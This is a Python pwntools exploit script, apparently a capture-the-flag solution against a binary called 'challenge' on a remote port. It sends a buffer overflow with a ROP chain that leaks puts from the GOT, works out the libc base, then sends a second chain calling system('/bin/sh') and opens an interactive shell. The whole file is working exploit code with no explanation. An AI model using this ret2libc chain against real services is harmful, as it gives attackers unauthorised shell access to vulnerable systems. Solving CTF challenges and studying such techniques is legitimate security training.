from pwn import * 
context.log_level = 'debug'

rdi = 0x0000000000401383
ret = 0x000000000040101a
puts_got =0x404020
puts_plt =0x401090
elf = context.binary = ELF('./challenge')
# r = process('./challenge')
r = remote('0',10000)
# lib = elf.libc
lib = ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
payload = b'a'*0x38 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym['main'])
# pause()
r.sendlineafter(b'What is your name? \n',payload)
r.sendlineafter(b"flag! \n",b'a')
r.recvuntil(b'None!')
leak = u64(r.recvuntil(b'\x7f')[1:].ljust(8,b'\x00'))
print(hex(leak))
pause()
lib.address = leak - lib.sym['puts']
print(hex(lib.address))
payload_ = b'a'*0x38 + p64(ret) + p64(rdi) + p64(next(lib.search(b'/bin/sh'))) + p64(lib.sym['system'])
r.sendlineafter(b'What is your name? \n',payload_)
r.sendlineafter(b"flag! \n",b'a')
r.interactive()